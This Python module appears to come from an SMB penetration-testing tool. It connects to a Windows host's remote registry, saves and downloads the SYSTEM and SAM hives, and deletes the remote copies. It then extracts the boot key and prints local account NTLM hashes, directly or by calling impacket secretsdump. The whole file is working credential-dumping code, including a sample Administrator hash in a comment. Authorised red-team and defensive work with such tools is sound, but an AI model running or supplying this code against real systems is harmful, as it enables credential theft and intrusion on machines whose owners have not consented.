from binascii import hexlify, unhexlify
from shutil import which
from slingerpkg.utils.printlib import *
from slingerpkg.lib.hashdump import *
from slingerpkg.utils.common import run_local_command


class secrets:
    def __init__(self):
        print_debug("WinReg Module Loaded!")
        self._bootKey = b""
        self._samKey = b""

    def getBootKey(self):
        self._bootKey = b""
        print_debug("Getting BootKey")
        bootKey = b""
        self.setup_dce_transport()
        self.dce_transport._connect("winreg")
        bootKey = self.dce_transport._get_boot_key()
        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        bootKey = unhexlify(bootKey)

        for i in range(len(bootKey)):
            self._bootKey += bootKey[transforms[i] : transforms[i] + 1]

        print_good("Target system bootKey: 0x%s" % hexlify(self._bootKey).decode("utf-8"))

    def saveHive(self, hiveName):
        print_debug(f"Saving Hive {hiveName}")
        self.setup_dce_transport()
        self.dce_transport._connect("winreg")
        remoteFileName = self.dce_transport._save_hive(hiveName)
        if remoteFileName is None:
            print_bad(f"Failed to save {hiveName} hive")
            return None, None
        saveName = "/tmp/" + hiveName + ".hive"
        if self.share.upper() == "C$":
            remotePath = f"\\Windows\\Temp\\{remoteFileName}"
            self.download(remotePath, saveName)
        elif self.share.upper() == "ADMIN$":
            remotePath = f"\\Temp\\{remoteFileName}"
            self.download(remotePath, saveName)

        return remotePath, saveName

    def secretsdump(self, args):
        try:
            if self.share.upper() != "C$" and self.share.upper() != "ADMIN$":
                print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
                return
        except AttributeError:
            print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
            return
        print_info("Dumping secrets...")
        remotePath_SYSTEM, localPath_SYSTEM = self.saveHive("SYSTEM")
        self.delete(remotePath_SYSTEM)
        print_info("Saving SAM Hive")
        remotePath_SAM, localPath_SAM = self.saveHive("SAM")
        self.delete(remotePath_SAM)
        # determine which command is avilable
        bins = ["secretsdump.py", "secretsdump", "impacket-secretsdump", "impacket-secretsdump.py"]
        binaryName = None
        for bin in bins:
            if which(bin):
                binaryName = which(bin)
        if binaryName is None:
            binaryName = "secretsdump.py"  # local copy
        print_info(f"Using {os.path.basename(binaryName)} to dump secrets")
        run_local_command(f"{binaryName} -sam {localPath_SAM} -system {localPath_SYSTEM} LOCAL")

    def hashdump(self, args):
        hashTable = []
        share = self.share
        try:
            if share.upper() != "C$" and share.upper() != "ADMIN$":
                print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
                return
        except AttributeError:
            print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
            return

        print_info("Dumping hashes...")
        # self.getBootKey()
        print_info("Saving SYSTEM Hive")
        remotePath_SYSTEM, localPath_SYSTEM = self.saveHive("SYSTEM")
        self.delete(remotePath_SYSTEM)
        print_info("Saving SAM Hive")
        remotePath_SAM, localPath_SAM = self.saveHive("SAM")
        self.delete(remotePath_SAM)
        sys_key = get_bootkey(localPath_SYSTEM)
        print(f"BootKey: {sys_key.hex()}")
        # Initialize registry access function
        h = RegHive(localPath_SAM)
        sam_key = get_hbootkey(h, sys_key)
        print(f"SamKey: {sam_key.hex()}")

        # list users and hashes
        hashTable = get_hashes(h, sam_key)
        # print(hashTable)
        # Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e119ec7919cc3b1d7ad859697cfa659:::
        for user in hashTable:
            print(f"{user['Username']}:{user['RID']}:{user['LMHash']}:{user['NTHash']}:::")
